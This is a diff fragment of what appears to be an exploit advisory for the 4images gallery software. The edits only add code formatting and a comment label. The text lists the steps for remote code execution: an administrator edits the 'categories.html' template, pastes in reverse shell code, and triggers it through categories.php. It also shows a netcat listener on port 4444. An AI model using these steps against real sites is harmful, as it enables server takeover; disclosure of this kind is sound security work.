@@ -6,10 +6,10 @@ To reproduce do the following:
 
 1. Login as administrator user
 2. Browse to "General" -> " Edit Templates" -> "Select Template Pack" -> "default_960px" -> "Load Theme"
-3. Select Template "categories.html"
+3. Select Template ```"categories.html"```
 4. Paste reverse shell code
 5. Click "Save Changes"
-6. Browse to "http://host/4images/categories.php?cat_id=1"
+6. Browse to ```"http://host/4images/categories.php?cat_id=1"```
 
 
 // HTTP POST request showing reverse shell payload
@@ -31,6 +31,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 F
 [...]
 ```
 
+// HTTP request showing reverse shell connection
 ```
 # nc -kvlp 4444
 listening on [any] 4444 ...
